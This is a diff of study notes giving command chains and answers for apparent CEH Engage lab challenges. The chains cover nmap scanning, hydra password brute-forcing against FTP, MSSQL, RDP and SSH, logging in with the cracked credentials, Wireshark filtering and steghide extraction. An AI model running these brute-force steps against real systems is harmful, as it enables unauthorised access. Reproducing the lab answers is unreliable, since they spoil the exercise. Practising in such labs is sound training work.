@@ -22,7 +22,7 @@ CEH Engage - Part I
 CEH Engage - Part II
 
 - C1 (nmap -p 21 --open 192.168.10.0/24 -> hydra -l nick -P Desktop/password.txt ftp://192.168.10.111): https://www.crushftp.com/
-- C2 (wireshark filter - http.request.method == POST): kety/apple
+- C2 (wireshark filter - http.request.method == POST -> login attempts): kety/apple
 - C3
 - C4 (wireshark filter udp): 192.168.10.144
 - C5 (wireshark tcp & udp port 111 & 135): 172.30.10.99
@@ -30,6 +30,27 @@ CEH Engage - Part II
 - C7
 - C8 (nmap -sn 192.168.10.0/24 -> nmap --script ms-sql* 192.168.10.144 -> hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql -> mysqlclient.py Server_mssrv:Spidy@192.168.10.144 -> dir C:\Users\Public\Downloads\MSS.txt): 7
 - C9 (nmap -p 3389 -sV --open 192.168.10.0/24 -> hydra -l "Maurice" -P rockyou.txt rdp://192.168.10.222): Pumpkin@1234
+- C10 (hybrid-analysis.com -> SHA-256):  d282
+- C11 (Share in Win -> Process Monitor Microsoft Sysinternals -> Open logfile and Find H3ll0.exe -> Process -> Parent ID): 6952
+- C12
+- C13 (nmap -p 2002 --open -sV <target-subnet>): 192.168.10.144
+- C14 (steghide extract -sf stealth.jpeg -p azerty@123 -> Open hidden.txt and find value): 3965222
+- C15 (searchsploit AirDrop 2.0): android/dos/46445.c
+
+
+----------------------
+
+CEH Engage - Part II
+
+- C1 (wireshark): 172.30.10.200
+- C2 (wireshark filter - http.request.method == POST -> login attempts): lee/test
+- C3 (Open cowrie.log): 172.30.10.99
+- C4 (nmap --script http-headers www.certifiedhacker.com)
+- C5 (nmap -p 22 --open 192.168.10.0/24 -> hydra -l "Martin" -P rockyou.txt ssh://192.168.10.101 -> ssh Martin@192.168.10.101 -> type Desktop\$ollers.txt): i2tr&^72546HJ*
+- C6
+- C7
+- C8
+- C9
 - C10
 - C11
 - C12
